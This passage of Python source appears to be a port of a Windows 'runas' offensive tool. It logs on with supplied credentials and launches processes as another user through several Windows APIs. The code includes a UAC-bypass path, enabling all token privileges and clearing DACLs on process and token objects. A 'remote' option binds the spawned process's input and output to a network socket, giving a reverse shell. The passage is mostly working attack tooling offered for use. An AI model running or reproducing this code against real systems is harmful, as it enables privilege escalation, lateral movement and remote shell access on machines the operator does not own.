        hTokenDupImpersonation = ctypes.c_void_p(0)
        if not LogonUser(username, domainName, password, logonType, logonProvider, hToken):
            raise RunAsPyException(f"LogonUser")
        if self.IsLimitedUserLogon(hToken, username, domainName, password):
            logging.warning(f"Logon for user '{ username.decode() }' is limited. Use the --logon-type value '{ self.logonTypeNotFiltered.value }' to obtain a more privileged token")
        if not DuplicateTokenEx(hToken, ctypes.wintypes.DWORD(AccessToken.TOKEN_ALL_ACCESS), ctypes.c_void_p(0), SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, ctypes.c_int(TokenImpersonation), ctypes.byref(hTokenDupImpersonation)):
            raise RunAsPyException(f"DuplicateTokenEx")
        pToken = ctypes.wintypes.HANDLE(0)
        if not OpenProcessToken(ctypes.wintypes.HANDLE(GetCurrentProcess()), ctypes.wintypes.DWORD(AccessToken.TOKEN_ALL_ACCESS), ctypes.byref(pToken)):
            raise RunAsPyException("Failed to obtain token")
        if AccessToken.GetTokenIntegrityLevel(pToken) < AccessToken.GetTokenIntegrityLevel(hTokenDupImpersonation):
            AccessToken.SetTokenIntegrityLevel(hTokenDupImpersonation, AccessToken.GetTokenIntegrityLevel(pToken))
        AccessToken.EnableAllPrivileges(hTokenDupImpersonation)
        if not CreateEnvironmentBlock(ctypes.byref(lpEnvironment), hToken, ctypes.c_bool(False)):
            logging.warning(f"Unable to create environment block")
        if not CreateProcessW(
            None,
            commandLine,
            None,
            None,
            True,
            CREATE_NO_WINDOW | CREATE_SUSPENDED | CREATE_UNICODE_ENVIRONMENT,
            lpEnvironment,
            (os.environ["SystemRoot"] + "\\System32"),
            ctypes.byref(self.startupInfo),
            ctypes.byref(processInfo)
        ):
            raise RunAsPyException(f"CreateProcess")
        hTokenProcess = ctypes.c_void_p(0)
        if not OpenProcessToken(ctypes.wintypes.HANDLE(processInfo.process), ctypes.wintypes.DWORD(AccessToken.TOKEN_ALL_ACCESS), ctypes.byref(hTokenProcess)):
            raise RunAsPyException(f"OpenProcessToken")
        AccessToken.SetTokenIntegrityLevel(hTokenProcess, AccessToken.GetTokenIntegrityLevel(hTokenDupImpersonation))
        SetSecurityInfo(processInfo.process, SE_OBJECT_TYPE.SE_KERNEL_OBJECT, SECURITY_INFORMATION.DACL_SECURITY_INFORMATION, ctypes.c_void_p(0), ctypes.c_void_p(0), ctypes.c_void_p(0), ctypes.c_void_p(0))
        SetSecurityInfo(hTokenProcess, SE_OBJECT_TYPE.SE_KERNEL_OBJECT, SECURITY_INFORMATION.DACL_SECURITY_INFORMATION, ctypes.c_void_p(0), ctypes.c_void_p(0), ctypes.c_void_p(0), ctypes.c_void_p(0))
        if not SetThreadToken(ctypes.byref(ctypes.wintypes.HANDLE(processInfo.thread)), hTokenDupImpersonation):
            raise RunAsPyException(f"SetThreadToken")
        ResumeThread(ctypes.wintypes.HANDLE(processInfo.thread))
        CloseHandle(hToken)
        CloseHandle(hTokenDupImpersonation)
        CloseHandle(hTokenProcess)

    def RunasCreateProcessAsUserW(self, username, domainName, password, logonType, logonProvider, commandLine, forceUserProfileCreation, userProfileExists, processInfo):
        hToken = ctypes.c_void_p(0)
        TokenPrimary = 2
        hTokenDuplicate = ctypes.c_void_p(0)
        lpEnvironment = ctypes.c_void_p(0)
        if not LogonUser(username, domainName, password, logonType, logonProvider, hToken):
            raise RunAsPyException(f"LogonUser")
        if not DuplicateTokenEx(hToken, ctypes.wintypes.DWORD(AccessToken.TOKEN_ALL_ACCESS), ctypes.c_void_p(0), SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, ctypes.c_int(TokenPrimary), ctypes.byref(hTokenDuplicate)):
            raise RunAsPyException(f"TokenDuplicateEx")
        if self.IsLimitedUserLogon(hTokenDuplicate, username, domainName, password):
            print(f"[*] Warning: Logon for user '{ username.decode() }' is limited. Use the --logon-type value '{ self.logonTypeNotFiltered.value }' to obtain a more privileged token")
        lpEnvironment = self.GetUserEnvironmentBlock(hTokenDuplicate, username, forceUserProfileCreation, userProfileExists)
        pToken = ctypes.wintypes.HANDLE(0)
        if not OpenProcessToken(ctypes.wintypes.HANDLE(GetCurrentProcess()), ctypes.wintypes.DWORD(AccessToken.TOKEN_ALL_ACCESS), ctypes.byref(pToken)):
            raise RunAsPyException("Failed to obtain token")
        AccessToken.EnablePrivilege("SeAssignPrimaryTokenPrivilege", pToken)
        AccessToken.EnableAllPrivileges(hTokenDuplicate)
        if not CreateProcessAsUser(hTokenDuplicate, ctypes.c_void_p(None), ctypes.wintypes.LPCSTR(commandLine.encode()), ctypes.c_void_p(0), ctypes.c_void_p(0), ctypes.c_bool(True), ctypes.wintypes.DWORD(CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT), ctypes.c_void_p(lpEnvironment), ctypes.wintypes.LPCSTR((os.environ["SystemRoot"] + "\\System32").encode()), ctypes.byref(self.startupInfo), ctypes.byref(processInfo)):
            raise RunAsPyException(f"CreateProcessAsUser")
        if lpEnvironment:
            DestroyEnvironmentBlock(lpEnvironment)
        CloseHandle(hToken)
        CloseHandle(hTokenDuplicate)

    def RunasCreateProcessWithTokenW(self, username, domainName, password, commandLine, logonType, logonFlags, logonProvider, processInfo):
        TokenPrimary = 1
        hToken = ctypes.c_void_p(0)
        hTokenDuplicate = ctypes.c_void_p(0)
        if not LogonUser(username, domainName, password, logonType, logonProvider, hToken):
            raise RunAsPyException("LogonUser")
        if not DuplicateTokenEx(hToken, ctypes.wintypes.DWORD(AccessToken.TOKEN_ALL_ACCESS), ctypes.c_void_p(0), SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, ctypes.c_int(TokenPrimary), ctypes.byref(hTokenDuplicate)):
            raise RunAsPyException("DuplicatetokenEx")
        if self.IsLimitedUserLogon(hTokenDuplicate, username, domainName, password):
            logging.warning(f"[*] Warning: Logon for user '{ username.decode() }' is limited. Use the --logon-type value '{ self.logonTypeNotFiltered.value }' to obtain a more privileged token")
        pToken = ctypes.wintypes.HANDLE(0)
        if not OpenProcessToken(ctypes.wintypes.HANDLE(GetCurrentProcess()), ctypes.wintypes.DWORD(AccessToken.TOKEN_ALL_ACCESS), ctypes.byref(pToken)):
            raise RunAsPyException("Failed to obtain token")
        AccessToken.EnablePrivilege("SeImpersonatePrivilege", pToken)
        AccessToken.EnableAllPrivileges(hTokenDuplicate)
        if not CreateProcessWithTokenW(hTokenDuplicate, logonFlags, ctypes.c_void_p(None), ctypes.wintypes.LPWSTR(commandLine), ctypes.wintypes.DWORD(CREATE_NO_WINDOW), ctypes.c_void_p(0), ctypes.c_void_p(0), ctypes.byref(self.startupInfo), ctypes.byref(processInfo)):
            raise RunAsPyException("CreateProcessWithTokenW")
        CloseHandle(hToken)
        CloseHandle(hTokenDuplicate)

    def RunasCreateProcessWithLogonW(self, username, domainName, password, logonType, logonFlags, commandLine, bypassUac, startupInfo, processInfo):
        if logonType == LOGON32_LOGON_NEW_CREDENTIALS.value:
            if not CreateProcessWithLogonW(username.decode(), domainName.decode(), password.decode(), ctypes.wintypes.DWORD(LOGON_NETCREDENTIALS_ONLY), None, commandLine, CREATE_NO_WINDOW, None, None, ctypes.byref(self.startupInfo), ctypes.byref(processInfo)):
                raise RunAsPyException(f"CreateProcessWithLogonW logon type 9")
        elif bypassUac:
            if logonType in [LOGON32_LOGON_NETWORK.value, LOGON32_LOGON_BATCH.value, LOGON32_LOGON_SERVICE.value, LOGON32_LOGON_NETWORK_CLEARTEXT.value]:
                logonTypeBypassUac = logonType
            else:
                logonTypeBypassUac = LOGON32_LOGON_NETWORK_CLEARTEXT.value
            if not self.CreateProcessWithLogonWUacBypass(logonTypeBypassUac, logonFlags, username, domainName, password, None, commandLine, processInfo):
                raise RunAsPyException(f"CreateProcessWithLogonWUacBypass")
        else:
            hTokenUacCheck = ctypes.c_void_p(0)
            if logonType != LOGON32_LOGON_INTERACTIVE.value:
                logging.warning(f"The function CreateProcessWithLogonW is not compatible with the requested logon type '{ logonType }'. Reverting to the Interactive logon type '2'. To force a specific logon type, use the flag combination --remote-impersonation and --logon-type.")
            CheckAvailableUserLogonType(username, password, domainName, LOGON32_LOGON_INTERACTIVE.value, LOGON32_PROVIDER_DEFAULT)
            if not LogonUser(username, domainName, password, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, hTokenUacCheck):
                raise RunAsPyException("LogonUser")
            if self.IsLimitedUserLogon(hTokenUacCheck, username, domainName, password):
                logging.warning(f"The logon for user '{ username.decode() }' is limited. Use the flag combination --bypass-uac and --logon-type '{ self.logonTypeNotFiltered.value }' to obtain a more privileged token.")
            CloseHandle(hTokenUacCheck)
            if not CreateProcessWithLogonW(username.decode(), domainName.decode(), password.decode(), logonFlags, None, commandLine, CREATE_NO_WINDOW, None, None, ctypes.byref(self.startupInfo), ctypes.byref(processInfo)):
                raise RunAsPyException(f"CreateProcessWithLogonW logon type 2")

    def RunasSetupStdHandlesForProcess(self, processTimeout, remote):
        self.hOutputWrite = ctypes.c_void_p(0)
        self.hErrorWrite = ctypes.c_void_p(0)
        self.hOutputRead = ctypes.c_void_p(0)
        hOutputReadTmpLocal = ctypes.c_void_p(0)
        self.socket = ctypes.c_void_p(0)
        if processTimeout > 0:
            hCurrentProcess = ctypes.wintypes.HANDLE(-1)
            if not CreateAnonymousPipeEveryoneAccess(hOutputReadTmpLocal, self.hOutputWrite):
                raise RunAsPyException("CreatePipe")
            if not DuplicateHandle(hCurrentProcess, self.hOutputWrite, hCurrentProcess, ctypes.byref(self.hErrorWrite), ctypes.wintypes.DWORD(0), True, DUPLICATE_SAME_ACCESS):
                raise RunAsPyException("DuplicateHandle stderr write pipe")
            if not DuplicateHandle(hCurrentProcess, hOutputReadTmpLocal, hCurrentProcess, ctypes.byref(self.hOutputRead), ctypes.wintypes.DWORD(0), False, DUPLICATE_SAME_ACCESS):
                raise RunAsPyException("DuplicateHandle stdout read pipe")
            CloseHandle(hOutputReadTmpLocal)
            hOutputReadTmpLocal = ctypes.c_void_p(0)
            PIPE_NOWAIT = ctypes.wintypes.DWORD(0x00000001)
            if not SetNamedPipeHandleState(self.hOutputRead, ctypes.byref(PIPE_NOWAIT), ctypes.c_void_p(0), ctypes.c_void_p(0)):
                raise RunAsPyException("SetNamedPipeHandleState")
            self.startupInfo.dwFlags = Startf_UseStdHandles
            self.startupInfo.hStdOutput = self.hOutputWrite
            self.startupInfo.hStdError = self.hErrorWrite
        elif remote != None:
            self.socket = self.ConnectRemote(remote)
            self.startupInfo.dwFlags = Startf_UseStdHandles
            self.startupInfo.hStdInput = self.socket
            self.startupInfo.hStdOutput = self.socket
            self.startupInfo.hStdError = self.socket

    def RunAs(self, username, password, cmd, domainName, processTimeout, logonType, createProcessFunction, remote, forceUserProfileCreation, bypassUac, remoteImpersonation):
        if not domainName:
            domainName = "."
        username = bytes(username.encode())
        password = bytes(password.encode())
        domainName = bytes(domainName.encode())
        commandLine = ParseCommonProcessInCommandline(cmd)
        logonProvider = LOGON32_PROVIDER_DEFAULT
        self.startupInfo.cb = ctypes.sizeof(self.startupInfo)
        processInfo = PROCESS_INFORMATION()
        self.RunasSetupStdHandlesForProcess(processTimeout, remote)
        self.stationDaclObj = WindowStationDACL()
        desktopName = self.stationDaclObj.AddAclToActiveWindowStation(domainName, username, logonType)
        self.startupInfo.lpDesktop = ctypes.wintypes.LPWSTR(desktopName.decode())
        if logonType == LOGON32_LOGON_NEW_CREDENTIALS.value:
            logonProvider = LOGON32_PROVIDER_WINNT50
            if not domainName:
                domainName = b"."
        CheckAvailableUserLogonType(username, password, domainName, logonType, logonProvider)
        if remoteImpersonation:
            self.RunasRemoteImpersonation(username, domainName, password, logonType, logonProvider, commandLine, processInfo)
        else:
            logonFlags = ctypes.c_uint32(0)
            userProfileExists = self.IsUserProfileCreated(username, password, domainName, logonType)
            if userProfileExists or forceUserProfileCreation:
                logonFlags = LOGON_WITH_PROFILE
            elif logonType != LOGON32_LOGON_NEW_CREDENTIALS.value and not forceUserProfileCreation and not userProfileExists:
                logging.warning(f"[*] Warning: User profile directory for user { username } does not exist. Use --force-profile if you want to force the creation.")
            if createProcessFunction == 2:
                self.RunasCreateProcessWithLogonW(username, domainName, password, logonType, logonFlags, commandLine, bypassUac, self.startupInfo, processInfo)
            else:
                if bypassUac:
                    raise RunAsPyException(f"The flag --bypass-uac is not compatible with {GetProcessFunction(createProcessFunction)} but only with --function '2' (CreateProcessWithLogonW)")
                if createProcessFunction == 0:
                    self.RunasCreateProcessAsUserW(username, domainName, password, logonType, logonProvider, commandLine, forceUserProfileCreation, userProfileExists, processInfo)
                elif createProcessFunction == 1:
                    self.RunasCreateProcessWithTokenW(username, domainName, password, commandLine, logonType, logonFlags, logonProvider, processInfo)
        output = ""
        if processTimeout > 0:
            CloseHandle(self.hOutputWrite)
            CloseHandle(self.hErrorWrite)
            self.hOutputWrite = ctypes.wintypes.DWORD(0)
            self.hErrorWrite = ctypes.wintypes.DWORD(0)
            WaitForSingleObject(processInfo.process, processTimeout)
            output += f"\n{self.ReadOutputFromPipe(self.hOutputRead)}"
        else:
            sessionId = ctypes.wintypes.DWORD()
            hResult = ProcessIdToSessionId(ctypes.wintypes.DWORD(GetCurrentProcessId()), ctypes.byref(sessionId))
            if not hResult:
                raise SystemError(f"[!] Error encountered when obtaining session id: {hResult} ({ctypes.GetLastError()})")
            if remoteImpersonation:
                logging.info(f"Running in session { sessionId } with process function 'Remote Impersonation'")
            else:
                logging.info(f"Running in session { sessionId } with process function { GetProcessFunction(createProcessFunction)}")
            logging.info(f"Using Station\\Desktop: { desktopName }")
            logging.info(f"Async process '{ commandLine }' with pid { processInfo.processId } created in background.")
        CloseHandle(processInfo.process)
        CloseHandle(processInfo.thread)
        self.CleanupHandles()
        return output

    def CleanupHandles(self):
        if self.hOutputRead.value:
            CloseHandle(self.hOutputRead)
        if self.hOutputWrite.value:
            CloseHandle(self.hOutputWrite)
        if self.hErrorWrite:
            CloseHandle(self.hErrorWrite)
        if self.socket:
            closesocket(self.socket)
        self.hOutputRead = ctypes.c_void_p(0)
        self.hOutputWrite = ctypes.c_void_p(0)
        self.hErrorWrite = ctypes.c_void_p(0)
        self.socket = ctypes.c_void_p(0)
        self.hTokenPreviousImpersonatingThread = ctypes.c_void_p(0)
        self.stationDaclObj = None


def Runas(username=None, password=None, cmd=None, domainName=None, processTimeout=120000, logonType=2, createProcessFunction=0, remote=None, forceUserProfileCreation=False, bypassUac=False, remoteImpersonation=False, verbose=False):
    if verbose:
        logging.getLogger().setLevel(logging.INFO)
    log_handler = logging.StreamHandler()
    log_handler.setLevel(logging.INFO)
    log_handler.setFormatter(runas_logging_formatter())
    logging.getLogger().addHandler(log_handler)
    invoker = RunAsPy()
    try:
        output = invoker.RunAs(username, password, cmd, domainName, processTimeout, logonType, createProcessFunction, remote, forceUserProfileCreation, bypassUac, remoteImpersonation)
    except Exception as e:
        invoker.CleanupHandles()
        output = f"{e}"
    return output
